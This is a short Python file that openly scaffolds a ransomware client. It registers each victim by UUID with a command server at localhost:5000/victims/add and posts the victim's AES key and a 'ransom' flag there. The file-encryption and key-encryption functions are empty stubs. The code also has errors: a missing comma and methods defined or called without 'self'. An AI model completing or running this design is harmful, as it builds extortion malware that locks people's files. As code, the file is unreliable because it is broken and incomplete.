import uuid
import json
import requests

with open('pubkey', 'r') as f:
    PUB_KEY = f.read()
URL = 'http://localhost:5000/victims/add'
HEADER = {
        "content-type": "application/json"
    }


class Client():
    def __init__(self):
        self.id = uuid.uuid1().hex
        self.aes_key = self.gen_key()
        self.init_virus()
    
    def init_virus(self):
        data = {
            'id': self.id
        }
        self.post_server(data)
        self.enc_file()
        self.enc_key()
        data = {
            'id': self.id,
            'aes_key': self.aes_key
            'ransom': False
        }
        self.post_server(data)
    
    def gen_key(self):
        pass

    def enc_key(self):
        pass

    def dec_key(self):
        pass

    def enc_file(self):
        pass

    def dec_file(self):
        pass

    def get_key(self):
        data = {
            'id': self.id,
            'aes_key': self.aes_key,
            'ransom': True
        }        
        res = post_server(data)
        self.aes_key = res['aes_key']

    def post_server(data, url=URL):
        payload = json.dumps(data)
        r = requests.post(url, payload, headers=HEADER)
        return r.json()

if __name__ == "__main__":
    client = Client()
    post_data = {"id": "mkf", "aes_key": "456", "ransom": True}
    client.post_server(post_data)
    # client.put(post_data)